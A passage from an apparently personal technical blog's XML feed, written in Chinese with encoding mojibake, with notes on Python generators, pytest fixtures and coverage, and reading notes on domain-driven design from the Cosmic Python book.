class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span>(<span class="hljs-params"><span class="hljs-built_in">max</span></span>):</span></span><span class="line">  n, a, b = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span></span><span class="line">  <span class="hljs-keyword">while</span> n &lt; <span class="hljs-built_in">max</span>:</span><span class="line">    <span class="hljs-keyword">yield</span> b</span><span class="line">    a, b = b, a + b</span><span class="line">    n = n + <span class="hljs-number">1</span></span><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;done&#x27;</span></span><span class="line"><span class="hljs-comment"># æ•è·Generatorçš„è¿”å›å€¼</span></span><span class="line">g = fib(<span class="hljs-number">6</span>)</span><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line">  <span class="hljs-keyword">try</span>:</span><span class="line">    x=<span class="hljs-built_in">next</span>(g)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g=&#x27;</span>,x)</span><span class="line">  <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Generrator return value:&#x27;</span>, e.value)</span><span class="line">    <span class="hljs-keyword">break</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python pytest</title>
      <link href="/2021/10/13/python-pytest/"/>
      <url>/2021/10/13/python-pytest/</url>
      
        <content type="html"><![CDATA[<p>pytest æ˜¯å¼ºå¤§çš„æµ‹è¯•æ¡†æ¶</p><p>å½“å‡½æ•°ä½¿ç”¨<code>test_</code>ä¸ºå¼€å¤´çš„æ—¶å€™ï¼Œå°±ä¼šåœ¨æ‰§è¡Œæµ‹è¯•çš„æ—¶å€™è¿›è¡Œæµ‹è¯•ã€‚</p><p>æ‰§è¡Œå‘½ä»¤ä¸ºï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">pytest</span> -v -s test_file.py</span></code></pre></div></div><h2 id="conftest-py"><a href="#conftest-py" class="headerlink" title="conftest.py"></a>conftest.py</h2><p><code>conftest.py</code>çš„ç‰¹ç‚¹:</p><ol><li>conftest.pyä¸è¿è¡Œçš„ç”¨ä¾‹è¦åœ¨åŒä¸€ä¸ªpakageä¸‹ï¼Œå¹¶ä¸”æœ‰__init__.pyæ–‡ä»¶</li><li>ä¸éœ€è¦importå¯¼å…¥ conftest.pyï¼Œpytestç”¨ä¾‹ä¼šè‡ªåŠ¨è¯†åˆ«è¯¥æ–‡ä»¶ï¼Œæ”¾åˆ°é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹å°±å¯ä»¥å…¨å±€ç›®å½•è°ƒç”¨äº†ï¼Œå¦‚æœæ”¾åˆ°æŸä¸ªpackageä¸‹ï¼Œé‚£å°±åœ¨è¯¥packageå†…æœ‰æ•ˆï¼Œå¯æœ‰å¤šä¸ªconftest.py</li><li>conftest.pyé…ç½®è„šæœ¬åç§°æ˜¯å›ºå®šçš„ï¼Œä¸èƒ½æ”¹åç§°</li><li>conftest.pyæ–‡ä»¶ä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶å¯¼å…¥</li><li>æ‰€æœ‰åŒç›®å½•æµ‹è¯•æ–‡ä»¶è¿è¡Œå‰éƒ½ä¼šæ‰§è¡Œconftest.pyæ–‡ä»¶</li></ol><p>åœ¨conftest.pyä¸­å°†ä¼šç”¨åˆ°<code>@pytest.fixture</code>è£…é¥°å™¨</p><h2 id="fixture"><a href="#fixture" class="headerlink" title="fixture"></a>fixture</h2><p>åœ¨<code>conftest.py</code>ä¸‹ï¼Œå¯ä»¥å®ç°æ•°æ®å…±äº«ï¼Œä¸éœ€è¦ import å°±èƒ½è‡ªåŠ¨æ‰¾åˆ°ä¸€äº›é…ç½®</p><p>fixtureå‡½æ•°å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-lasso codeBlockLines"><span class="line">fixtureï¼ˆscope=<span class="hljs-string">&#x27;function&#x27;</span>ï¼Œ<span class="hljs-keyword">params</span>=<span class="hljs-literal">None</span>ï¼Œautouse=<span class="hljs-literal">False</span>ï¼Œids=<span class="hljs-literal">None</span>ï¼Œname=<span class="hljs-literal">None</span>ï¼‰</span></code></pre></div></div><ul><li>scopeå‚æ•°å¯ä»¥æ§åˆ¶fixtureçš„ä½œç”¨èŒƒå›´ï¼Œscopeï¼šæœ‰å››ä¸ªçº§åˆ«å‚æ•°â€functionâ€ï¼ˆé»˜è®¤ï¼‰ï¼Œâ€classâ€ï¼Œâ€moduleâ€ï¼Œâ€session</li><li>paramsï¼šä¸€ä¸ªå¯é€‰çš„å‚æ•°åˆ—è¡¨ï¼Œæ¯ä¸ªå‚æ•°æ‰§è¡Œä¸€éï¼Œç›¸å½“äºforå¾ªç¯</li><li>autouseï¼šå¦‚æœTrueï¼Œåˆ™ä¸ºæ‰€æœ‰æµ‹è¯•æ¿€æ´»fixture funcå¯ä»¥çœ‹åˆ°å®ƒã€‚ <strong>å¯ä»¥ä½œä¸ºé»˜è®¤æ‰§è¡Œçš„æµ‹è¯•ä½¿ç”¨</strong></li><li>idsï¼šæ¯ä¸ªå­—ç¬¦ä¸²idçš„åˆ—è¡¨ï¼Œæ¯ä¸ªå­—ç¬¦ä¸²å¯¹åº”äºparamsè¿™æ ·ä»–ä»¬å°±æ˜¯æµ‹è¯•IDçš„ä¸€éƒ¨åˆ†ã€‚å¦‚æœæ²¡æœ‰æä¾›IDå®ƒä»¬å°†ä»paramsè‡ªåŠ¨ç”Ÿæˆ</li><li>nameï¼šfixtureçš„åç§°ã€‚</li></ul><p>scopeä½œç”¨èŒƒå›´ï¼š session&gt;module&gt;class&gt;function</p><ul><li>functionï¼šæ¯ä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•éƒ½ä¼šè°ƒç”¨</li><li>classï¼šæ¯ä¸€ä¸ªç±»è°ƒç”¨ä¸€æ¬¡ï¼Œä¸€ä¸ªç±»ä¸­å¯ä»¥æœ‰å¤šä¸ªæ–¹æ³•</li><li>moduleï¼šæ¯ä¸€ä¸ª.pyæ–‡ä»¶è°ƒç”¨ä¸€æ¬¡ï¼Œè¯¥æ–‡ä»¶å†…åˆæœ‰å¤šä¸ªfunctionå’Œclass</li><li>sessionï¼šæ˜¯å¤šä¸ªæ–‡ä»¶è°ƒç”¨ä¸€æ¬¡ï¼Œå¯ä»¥è·¨.pyæ–‡ä»¶è°ƒç”¨ï¼Œæ¯ä¸ª.pyæ–‡ä»¶å°±æ˜¯module</li></ul><p>ä½¿ç”¨æ–¹æ³•æ˜¯åœ¨æµ‹è¯•ç”¨ä¾‹é‡Œé¢ç›´æ¥å†™æ–¹æ³•åå°±å¯ä»¥äº†</p><p>å¦å¤–å¯ä»¥ä½¿ç”¨<code>pytest --fixtures</code> æŸ¥çœ‹æ‰€æœ‰å›ºä»¶</p><h2 id="pytest-ini"><a href="#pytest-ini" class="headerlink" title="pytest.ini"></a>pytest.ini</h2><p>todo</p><h2 id="æµ‹è¯•ä»£ç è¦†ç›–ç‡"><a href="#æµ‹è¯•ä»£ç è¦†ç›–ç‡" class="headerlink" title="æµ‹è¯•ä»£ç è¦†ç›–ç‡"></a>æµ‹è¯•ä»£ç è¦†ç›–ç‡</h2><p><code>coverage</code> ç”¨äºå¯¹æµ‹è¯•çš„æ—¶å€™ï¼Œå“ªäº›ä»£ç è¢«æ‰§è¡Œäº†ï¼Œå¯ä»¥åæ˜ å‡ºå®Œæˆç¨‹åº¦ã€‚</p><p><code>pip install pytest-cov</code></p><p>ä½¿ç”¨</p><p><code>pytest --cov --cov-report xml</code></p><p>è¿™æ ·å°±ä¼šç”Ÿæˆä¸€ä¸ª<code>xml</code>æ–‡ä»¶</p><p>å‘½ä»¤è¡Œä¸­ä½¿ç”¨<code>coverage report</code> æŸ¥çœ‹æ•´ä½“è¦†ç›–ç‡</p><p>VsCodeä¸­æ¨èæ’ä»¶<code>Coverage Gutters</code></p><p>é…ç½®:</p><p><img src="/2021/10/13/python-pytest/1.png"></p><p><strong>æ³¨æ„ï¼šè¿™æ ·è®¾ç½®ä¼šå¯¼è‡´vscodeåœ¨æµ‹è¯•æ—¶æ— æ³•ä½¿ç”¨æ–­ç‚¹è°ƒè¯•ï¼ï¼ï¼</strong></p><h2 id="caplog-å–logæ—¥å¿—"><a href="#caplog-å–logæ—¥å¿—" class="headerlink" title="caplog å–logæ—¥å¿—"></a>caplog å–logæ—¥å¿—</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_something</span>(<span class="hljs-params">caplog</span>)</span></span><span class="line"><span class="hljs-function">    <span class="hljs-title">caplog</span>.<span class="hljs-title">set_level</span>(<span class="hljs-params">logging.DEBUG</span>)</span></span><span class="line"><span class="hljs-function">    <span class="hljs-title">assert</span> <span class="hljs-title">caplog</span>.<span class="hljs-title">messages</span>[0] == &#x27;<span class="hljs-title">This</span> <span class="hljs-title">is</span> <span class="hljs-title">a</span> <span class="hljs-title">debug</span> <span class="hljs-title">message</span>&#x27;</span></span><span class="line"><span class="hljs-function">    <span class="hljs-title">caplog</span>.<span class="hljs-title">clear</span>()</span></span></code></pre></div></div><p>æˆ–è€… <code>unittest.mock.path</code> æ¥mock <code>sys.stdout</code></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO</span><span class="line"><span class="hljs-keyword">from</span> unittest.mock <span class="hljs-keyword">import</span> patch</span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_print</span>():</span></span><span class="line">    expected = <span class="hljs-string">&#x27;this is a message&#x27;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-keyword">with</span> path(<span class="hljs-string">&#x27;sys.stdout&#x27;</span>, new=StringIO()) <span class="hljs-keyword">as</span> fake_out:</span><span class="line">        <span class="hljs-keyword">assert</span> fake_out.getvalue().strip() == expected</span></code></pre></div></div><ul><li><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c14/p01_testing_output_sent_to_stdout.html">å‚è€ƒ</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python é¢†åŸŸé©±åŠ¨ç¼–ç¨‹ ç¬”è®°</title>
      <link href="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cosmicpython.com/book/introduction.html">Pythonè½¯ä»¶è®¾è®¡</a></p><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ä»€ä¹ˆæ˜¯DIP(The Dependency Inversion Principle ä¾èµ–åè½¬åŸåˆ™)ï¼Œ ä»–çš„å®šä¹‰æ˜¯ä»€ä¹ˆ</p><blockquote><p>ä¸€ã€é«˜çº§æ¨¡å—ä¸åº”è¯¥ä¾èµ–äºä½çº§æ¨¡å—ï¼Œä¸¤è€…éƒ½åº”è¯¥ä¾èµ–äºæŠ½è±¡ã€‚</p><p>äºŒã€æŠ½è±¡ä¸åº”è¯¥ä¾èµ–äºç»†èŠ‚ï¼Œç›¸åï¼Œç»†èŠ‚åº”è¯¥ä¾èµ–äºæŠ½è±¡ã€‚</p></blockquote><p>æ‰€ä»¥é€šå¸¸çš„æ¨¡å¼æ˜¯ä¸šåŠ¡é€»è¾‘ -&gt; ä¸­é—´å±‚ -&gt; æ•°æ®é€»è¾‘</p><h2 id="ç¬¬1éƒ¨åˆ†-æ„å»ºæ”¯æŒé¢†åŸŸå»ºæ¨¡çš„ä½“ç³»ç»“æ„"><a href="#ç¬¬1éƒ¨åˆ†-æ„å»ºæ”¯æŒé¢†åŸŸå»ºæ¨¡çš„ä½“ç³»ç»“æ„" class="headerlink" title="ç¬¬1éƒ¨åˆ†: æ„å»ºæ”¯æŒé¢†åŸŸå»ºæ¨¡çš„ä½“ç³»ç»“æ„"></a>ç¬¬1éƒ¨åˆ†: æ„å»ºæ”¯æŒé¢†åŸŸå»ºæ¨¡çš„ä½“ç³»ç»“æ„</h2><blockquote><p>æˆ‘ä»¬å‘ç°ï¼Œè®¸å¤šå¼€å‘äººå‘˜åœ¨è¢«è¦æ±‚è®¾è®¡ä¸€ä¸ªæ–°ç³»ç»Ÿæ—¶ï¼Œä¼šç«‹å³å¼€å§‹æ„å»ºä¸€ä¸ªæ•°æ®åº“æ¨¡å¼ï¼Œè€Œå¯¹è±¡æ¨¡å‹åˆ™æ˜¯äº‹åæ‰æƒ³åˆ°çš„ã€‚è¿™å°±æ˜¯ä¸€åˆ‡å¼€å§‹å‡ºé”™çš„åœ°æ–¹ã€‚ç›¸åï¼Œè¡Œä¸ºåº”è¯¥æ”¾åœ¨ç¬¬ä¸€ä½ï¼Œå¹¶é©±åŠ¨æˆ‘ä»¬çš„å­˜å‚¨éœ€æ±‚ã€‚æ¯•ç«Ÿï¼Œæˆ‘ä»¬çš„å®¢æˆ·å¹¶ä¸å…³å¿ƒæ•°æ®æ¨¡å‹ã€‚ä»–ä»¬å…³å¿ƒç³»ç»Ÿåšä»€ä¹ˆ; å¦åˆ™ä»–ä»¬åªä¼šä½¿ç”¨ç”µå­è¡¨æ ¼ã€‚</p></blockquote><p>é€šè¿‡ TDDæ„å»ºå¯Œå¯¹è±¡æ¨¡å‹,æå‡ºäº†å››ä¸ªå…³é”®çš„è®¾è®¡æ¨¡å¼:</p><ul><li>ä»“åº“æ¨¡å¼ï¼Œå¯¹æŒä¹…å­˜å‚¨æ¦‚å¿µçš„æŠ½è±¡</li><li>æœåŠ¡å±‚æ¨¡å¼æ¥æ¸…æ¥šåœ°å®šä¹‰æˆ‘ä»¬çš„ç”¨ä¾‹å¼€å§‹å’Œç»“æŸçš„ä½ç½®</li><li>æä¾›åŸå­æ“ä½œçš„å·¥ä½œå•å…ƒæ¨¡å¼</li><li>åŠ å¼ºæ•°æ®å®Œæ•´æ€§çš„èšåˆæ¨¡å¼</li></ul><img src="c42a133ff98a6e6416513c6244ba590f.png" alt="1.png" style="zoom:50%;" /><img src="b75234a13d34a59dbe15193d61bbe56e.png" alt="2.png" style="zoom:50%;" /><h3 id="1-åŸŸå»ºæ¨¡-Domain-Modeling"><a href="#1-åŸŸå»ºæ¨¡-Domain-Modeling" class="headerlink" title="1. åŸŸå»ºæ¨¡ Domain Modeling"></a>1. åŸŸå»ºæ¨¡ Domain Modeling</h3><blockquote><p> å•å…ƒæµ‹è¯•çš„åç§°æè¿°äº†æˆ‘ä»¬å¸Œæœ›ä»ç³»ç»Ÿä¸­çœ‹åˆ°çš„è¡Œä¸ºï¼Œæˆ‘ä»¬ä½¿ç”¨çš„ç±»å’Œå˜é‡çš„åç§°å–è‡ªä¸šåŠ¡æœ¯è¯­ã€‚æˆ‘ä»¬å¯ä»¥å‘éæŠ€æœ¯äººå‘˜åŒäº‹å±•ç¤ºè¿™æ®µä»£ç ï¼Œä»–ä»¬ä¼šåŒæ„è¿™æ­£ç¡®åœ°æè¿°äº†ç³»ç»Ÿçš„è¡Œä¸ºã€‚</p></blockquote><p>Domain Model ä¹Ÿå°±æ˜¯æ ¸å¿ƒæ¨¡å‹ï¼Œæ˜¯åœ¨å‰¥ç¦»äº†æ•°æ®ç»†èŠ‚ï¼Œä¸“æ³¨äºå¤„ç†ä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹ï¼Œè¿™é‡Œä¹Ÿæ˜¯<strong>æœ€å¸¸è¢«ä¿®æ”¹</strong>çš„åœ°æ–¹ã€‚</p><p>è¦æ¸…æ¥šï¼Œå‰¥ç¦»äº†æ•°æ®åï¼Œæ‰€æœ‰çš„é€»è¾‘éƒ½æ˜¯åœ¨æ ¸å¿ƒæ¨¡å‹é‡Œé¢è¿›è¡Œçš„ã€‚</p><p>é‚£ä¹ˆå°±è¦æ€è€ƒä¸€äº›é—®é¢˜ã€‚</p><ol><li>åœ¨ä¸€å¼€å§‹è®¾è®¡çš„æ—¶å€™ï¼Œé¦–å…ˆå°±æ˜¯å¯¹è¿™ä¸€å—ä»£ç çš„è¯•è¯•ï¼Œå¹¶ä¸”æ˜¯ä»¥æµ‹è¯•é©±åŠ¨çš„ï¼Œé‚£ä¹ˆæ•°æ®æ€ä¹ˆæ¥ï¼Ÿ æ€ä¹ˆæµ‹è¯•</li><li>å“ªäº›æ˜¯çœŸæ­£çš„ä¸šåŠ¡é€»è¾‘ï¼Œå“ªäº›æ˜¯åº•å±‚é€»è¾‘ï¼Ÿ</li></ol><p>åœ¨ä¹¦ä¸­ç»™å‡ºäº†ä½¿ç”¨<code>@dataclass</code>æ¥å»ºç«‹ä¸€ä¸ª<code>Value Object</code>çš„æ–¹å¼æ¥åˆ†é…äº†ä¸€ä¸ªä¸å¯å˜åŠ¨çš„æ•°æ®å®¹å™¨ã€‚</p><p>åœ¨Domain Modelä¸­éœ€è¦ä¿æŒè‰¯å¥½çš„æ³¨è§£ä¹ æƒ¯ï¼Œæ–¹ä¾¿é˜…è¯»ã€‚</p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/b694248664d2cf393319cabaff43e9fc.png" alt="8.png"></p><h3 id="2-åº“æ¨¡å¼-Repository-Pattern"><a href="#2-åº“æ¨¡å¼-Repository-Pattern" class="headerlink" title="2. åº“æ¨¡å¼ Repository Pattern"></a>2. åº“æ¨¡å¼ Repository Pattern</h3><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/bdd1c063c41bb94ab7759fe185b52529.png" alt="3.png"></p><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/275344b3f8510c070a600196dff79e86.png" alt="4.png"></p><p>å¦‚ä¸Šæ‰€ç¤ºçš„æ¨¡å‹ï¼Œé¢†åŸŸæ¨¡å‹ä¸ä¾èµ–äºæ•°æ®å±‚ï¼Œè€Œæ˜¯åè¿‡æ¥çš„ä¾èµ–å…³ç³»ã€‚</p><p>è¿™ç§è®¾è®¡æ¨¡å¼å«åšä¾èµ–åè½¬åŸåˆ™ï¼ˆDIPï¼‰ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªå«åšæ§åˆ¶åè½¬ï¼ˆIoCï¼‰ï¼Œè¯´çš„æ˜¯åŸæœ¬Aæ§åˆ¶Bçš„æµç¨‹å˜æˆäº†Bç”±å¤–éƒ¨å®¹å™¨æ§åˆ¶ã€‚</p><p>é‚£ä¹ˆè¿™æ ·å°±éœ€è¦è§£å†³ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è®©Domainè°ƒç”¨æ•°æ®å±‚çš„å†…å®¹ã€‚æ‰€ä»¥å°±æœ‰äº†ä»“åº“è¿™æ ·çš„é€‚é…å™¨ã€‚</p><p>æŒ‰ç…§æˆ‘ç›®å‰çš„ç†è§£ï¼Œé€‚é…å™¨å…¶ä¸­ä¸€ä¸ªä½œç”¨å°±æ˜¯å°†å­˜åœ¨DBä¸­çš„Domainå®ä¾‹æå–å‡ºæ¥ï¼Œç„¶åç»™åˆ°Domain Modelä¸­æ‰§è¡Œã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># load all batches from the DB</span></span><span class="line"> batches = session.query(Batch).<span class="hljs-built_in">all</span>()</span><span class="line"></br></span><span class="line"> <span class="hljs-comment"># call our domain service</span></span><span class="line"> allocate(line, batches)</span></code></pre></div></div><blockquote><p>æˆ‘ä»¬åšæŒå®šä¹‰æ¥å£æ˜¯æˆ‘ä»¬ç¨‹åºå’Œæˆ‘ä»¬æŠ½è±¡å‡ºæ¥çš„ä¸œè¥¿ä¹‹é—´æœ‰ä¸€ä¸ªçº¦å®šã€‚å¯¹äºè°ƒç”¨æ–¹å¹¶ä¸å…³å¿ƒä¸€ä¸ªæ–¹æ³•ç©¶ç«Ÿæ˜¯æ€ä¹ˆå®ç°çš„ã€‚æˆ‘ä»¬åªæƒ³çŸ¥é“è¿™ä¸ªæ–¹æ³•èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆã€‚</p></blockquote><ul><li>å…¶ä¸­ç”¨åˆ°äº†æ•°æ®åº“çš„ORMæŠ€æœ¯ï¼Œå³æŠŠè¡¨å’Œç±»å…³è”èµ·æ¥ï¼Œé‡ç‚¹æ˜¯sessionå’Œmapperã€‚</li></ul><p>åœ¨å†…å­˜ä¸­å»ºç«‹æ•°æ®åº“çš„æ–¹æ³•æ˜¯ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">in_memory_db</span>():</span></span><span class="line">    engine = create_engine(<span class="hljs-string">&quot;sqlite:///:memory:&quot;</span>)</span><span class="line">    metadata.create_all(engine)</span><span class="line">    <span class="hljs-keyword">return</span> engine</span></code></pre></div></div><p>ä»“åº“æ¨¡å¼çš„ä¸€ä¸ªä¼˜åŠ¿å°±æ˜¯å¯ä»¥æ–¹ä¾¿çš„ä½¿ç”¨å‡æ•°æ®åšæµ‹è¯•ï¼Œå› ä¸ºå¯ä»¥åœ¨testä¸­å»ºç«‹ä¸€ä¸ªFakeRepositoryä»“åº“æ¥æ¨¡æ‹Ÿæµ‹è¯•ã€‚</p><h2 id="3-å…³äºè€¦åˆå’ŒæŠ½è±¡çš„æ¦‚å¿µ"><a href="#3-å…³äºè€¦åˆå’ŒæŠ½è±¡çš„æ¦‚å¿µ" class="headerlink" title="3. å…³äºè€¦åˆå’ŒæŠ½è±¡çš„æ¦‚å¿µ"></a>3. å…³äºè€¦åˆå’ŒæŠ½è±¡çš„æ¦‚å¿µ</h2><blockquote><p>å½“æˆ‘ä»¬å¿…é¡»ä»åŸºæœ¬åŸåˆ™å‡ºå‘æ¥è§£å†³é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šå°è¯•ç¼–å†™ä¸€ä¸ªç®€å•çš„å®ç°ï¼Œç„¶åé‡æ„ä»¥è·å¾—æ›´å¥½çš„è®¾è®¡ã€‚æˆ‘ä»¬å°†åœ¨æ•´æœ¬ä¹¦ä¸­ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘ä»¬åœ¨ç°å®ä¸–ç•Œä¸­ç¼–å†™ä»£ç çš„æ–¹å¼: ä»é—®é¢˜çš„æœ€å°éƒ¨åˆ†çš„è§£å†³æ–¹æ¡ˆå¼€å§‹ï¼Œç„¶åè¿­ä»£ä½¿è§£å†³æ–¹æ¡ˆæ›´åŠ ä¸°å¯Œå’Œæ›´å¥½åœ°è®¾è®¡ã€‚</p></blockquote><p>æˆ‘ä»¬å°†åœ¨è¿™é‡Œè¿ç”¨ä¸€ä¸ªæŠ€å·§ï¼Œæˆ‘ä»¬å°†åœ¨æœ¬ä¹¦åé¢å¤§è§„æ¨¡è¿ç”¨è¿™ä¸ªæŠ€å·§ã€‚æˆ‘ä»¬è¦æŠŠæˆ‘ä»¬<strong>æƒ³åšçš„</strong>å’Œ<strong>æ€ä¹ˆåš</strong>çš„åŒºåˆ†å¼€æ¥ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œé¡¶çº§å‡½æ•°å°±æ˜¯åœ¨è¾“å…¥åå°†å¤æ‚çš„é€»è¾‘äº¤åˆ°ä½çº§å‡½æ•°ï¼Œä½çº§å‡½æ•°ç»è¿‡å¤æ‚å¤„ç†å¾—åˆ°å¦‚ä½•åšåï¼Œäº¤ç»™é¡¶çº§å‡½æ•°ï¼Œç„¶åé¡¶çº§å‡½æ•°æ ¹æ®æ€ä¹ˆåšæ¥æ‰§è¡Œä»»åŠ¡ã€‚</p><p>è¿™æ ·ä¸€æ¥ï¼Œæµ‹è¯•çš„æ—¶å€™ï¼Œåšä½çº§å‡½æ•°çš„æµ‹è¯•å°±æ›´åŠ æ–¹ä¾¿ã€‚</p><h2 id="4-æœåŠ¡å±‚"><a href="#4-æœåŠ¡å±‚" class="headerlink" title="4. æœåŠ¡å±‚"></a>4. æœåŠ¡å±‚</h2><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/c8149ce406c5dad9eae3b55d1b76e506.png" alt="5.png"></p><p>å…¸å‹çš„æœåŠ¡å±‚åŠŸèƒ½æœ‰ç±»ä¼¼çš„æ­¥éª¤:</p><ol><li>ä»repositoryä¸­æå–å¯¹è±¡</li><li>å¯¹è¯·æ±‚è¿›è¡Œæ£€æŸ¥æˆ–è€…æ–­è¨€</li><li>æ‰§è¡Œdomainæ¨¡å‹ä¸­çš„å‡½æ•°</li><li>å½“ä¸€åˆ‡æ­£å¸¸ï¼Œä¿å­˜æˆ–è€…æ›´æ–°</li></ol><p>ä¸ºä»€ä¹ˆè¦åŠ å…¥è¿™ä¸€å±‚ï¼Ÿ </p><ol><li>å› ä¸ºåœ¨æ²¡åŠ å…¥è¿™ä¸€å±‚çš„æ—¶å€™ï¼Œåše2eçš„æµ‹è¯•å¤æ‚ã€‚</li><li>åŠ å…¥è¿™ä¸€å±‚åï¼Œå±•ç¤ºå±‚åªéœ€è¦è´Ÿè´£ç®€å•çš„è°ƒç”¨é€»è¾‘ï¼Œè€ŒæœåŠ¡å±‚åˆ™è´Ÿè´£å°†æ‰€éœ€å†…å®¹ç¼–æ’èµ·æ¥ã€‚</li></ol><p><img src="/2021/10/12/cosmicpython-python-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/b9feffbb61514fcd5859e9101e1794ad.png" alt="6.png"></p><h2 id="TDD-åœ¨é«˜é€Ÿæ¡£å’Œä½é€Ÿæ¡£"><a href="#TDD-åœ¨é«˜é€Ÿæ¡£å’Œä½é€Ÿæ¡£" class="headerlink" title="TDD åœ¨é«˜é€Ÿæ¡£å’Œä½é€Ÿæ¡£"></a>TDD åœ¨é«˜é€Ÿæ¡£å’Œä½é€Ÿæ¡£</h2><blockquote><p>æµ‹è¯•åº”è¯¥å¸®åŠ©æˆ‘ä»¬å¤§èƒ†åœ°æ”¹å˜æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œä½†æ˜¯æˆ‘ä»¬ç»å¸¸çœ‹åˆ°å›¢é˜Ÿé’ˆå¯¹ä»–ä»¬çš„é¢†åŸŸæ¨¡å‹ç¼–å†™äº†å¤ªå¤šçš„æµ‹è¯•ã€‚å½“ä»–ä»¬æ”¹å˜ä»–ä»¬çš„ä»£ç åº“å¹¶å‘ç°ä»–ä»¬éœ€è¦æ›´æ–°æ•°åç”šè‡³æ•°ç™¾ä¸ªå•å…ƒæµ‹è¯•æ—¶ï¼Œè¿™ä¼šå¯¼è‡´é—®é¢˜ã€‚</p></blockquote><blockquote><p>æˆ‘ä»¬ç”¨çš„æ¯”å–»æ˜¯â€œæ¢æ¡£â€ã€‚å‡ºå‘æ—¶ï¼Œè‡ªè¡Œè½¦éœ€è¦æŒ‚ä½æŒ¡ï¼Œè¿™æ ·æ‰èƒ½å…‹æœæƒ¯æ€§ã€‚ä¸€æ—¦æˆ‘ä»¬å‡ºå‘å¹¶å¼€å§‹è·‘æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ¢ä¸Šé«˜é€Ÿæ¡£æ¥æé«˜é€Ÿåº¦å’Œæ•ˆç‡; ä½†æ˜¯å¦‚æœæˆ‘ä»¬çªç„¶é‡åˆ°é™¡å³­çš„å±±å¡æˆ–è€…å› ä¸ºå±é™©è€Œè¢«è¿«å‡é€Ÿï¼Œæˆ‘ä»¬ä¼šå†æ¬¡é™åˆ°ä½é€Ÿæ¡£ï¼Œç›´åˆ°æˆ‘ä»¬å¯ä»¥å†æ¬¡åŠ é€Ÿã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´åœ¨å½“éœ€è¦ç†æ¸…æ¥šåŸŸæ¨¡å‹çš„ç‰¹æ€§çš„æ—¶å€™ï¼Œä½¿ç”¨ä½é€ŸæŒ¡æ¥å‰è¿›ã€‚å½“åŸŸæ¨¡å‹æ¯”è¾ƒç¨³å®šï¼Œéœ€è¦æ·»åŠ 